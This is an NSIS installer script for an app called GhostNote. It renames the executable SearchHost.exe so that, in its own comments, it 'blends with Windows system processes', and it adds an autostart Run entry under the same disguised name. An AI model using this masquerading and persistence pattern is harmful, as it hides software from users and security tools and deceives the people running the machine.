; GhostNote Installer
; Build with: makensis installer.nsi

!define APP_NAME "GhostNote"
!define APP_VERSION "1.0.0"
!define APP_EXE "SearchHost.exe"
!define PROC_NAME "SearchHost"
!define REG_KEY "Software\GhostNote"

Name "${APP_NAME}"
OutFile "GhostNote-Setup.exe"
InstallDir "$LOCALAPPDATA\${PROC_NAME}"
InstallDirRegKey HKCU "${REG_KEY}" "InstallPath"
RequestExecutionLevel user
SetCompressor lzma

; Pages
Page directory
Page instfiles
UninstPage uninstConfirm
UninstPage instfiles

Section "GhostNote" SEC01
  SetOutPath "$INSTDIR"

  ; Copy exe — installed as SearchHost.exe (blends with Windows system processes)
  File "/oname=${APP_EXE}" "GhostNote.exe"

  ; Write registry
  WriteRegStr HKCU "${REG_KEY}" "InstallPath" "$INSTDIR"
  WriteRegStr HKCU "${REG_KEY}" "Version" "${APP_VERSION}"

  ; Create uninstaller
  WriteUninstaller "$INSTDIR\Uninstall.exe"

  ; Add to Programs list
  WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Uninstall\GhostNote" "DisplayName" "GhostNote"
  WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Uninstall\GhostNote" "UninstallString" "$INSTDIR\Uninstall.exe"
  WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Uninstall\GhostNote" "DisplayVersion" "${APP_VERSION}"
  WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Uninstall\GhostNote" "Publisher" "GhostNote"

  ; Desktop shortcut — name says GhostNote, runs SearchHost.exe
  CreateShortcut "$DESKTOP\GhostNote.lnk" "$INSTDIR\${APP_EXE}"

  ; Start menu
  CreateDirectory "$SMPROGRAMS\GhostNote"
  CreateShortcut "$SMPROGRAMS\GhostNote\GhostNote.lnk" "$INSTDIR\${APP_EXE}"
  CreateShortcut "$SMPROGRAMS\GhostNote\Uninstall.lnk" "$INSTDIR\Uninstall.exe"

  ; Auto-start with Windows (registry key name also blends in)
  WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Run" "${PROC_NAME}" "$INSTDIR\${APP_EXE}"

  ; Launch app after install
  Exec "$INSTDIR\${APP_EXE}"
SectionEnd

Section "Uninstall"
  ; Kill running process
  ExecWait 'taskkill /F /IM ${APP_EXE}'

  ; Remove files
  Delete "$INSTDIR\${APP_EXE}"
  Delete "$INSTDIR\Uninstall.exe"
  RMDir "$INSTDIR"

  ; Remove shortcuts
  Delete "$DESKTOP\GhostNote.lnk"
  Delete "$SMPROGRAMS\GhostNote\GhostNote.lnk"
  Delete "$SMPROGRAMS\GhostNote\Uninstall.lnk"
  RMDir "$SMPROGRAMS\GhostNote"

  ; Remove registry
  DeleteRegKey HKCU "${REG_KEY}"
  DeleteRegKey HKCU "Software\Microsoft\Windows\CurrentVersion\Uninstall\GhostNote"
  DeleteRegValue HKCU "Software\Microsoft\Windows\CurrentVersion\Run" "${PROC_NAME}"
SectionEnd
